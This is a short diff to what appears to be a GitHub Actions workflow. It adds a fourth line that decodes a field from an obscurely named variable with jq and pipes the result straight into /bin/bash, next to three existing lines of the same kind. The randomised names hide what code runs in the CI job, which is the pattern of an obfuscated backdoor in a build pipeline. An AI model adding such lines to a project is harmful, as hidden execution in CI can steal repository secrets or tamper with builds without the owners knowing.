@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$zmih23" | jq -r .agvb450 | /bin/bash
           echo $psbrp112 | jq -r .xamli00 | /bin/bash
           echo $lru60 | jq -r .okho1502 | /bin/bash
+          echo $m09 | jq -r .h58 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
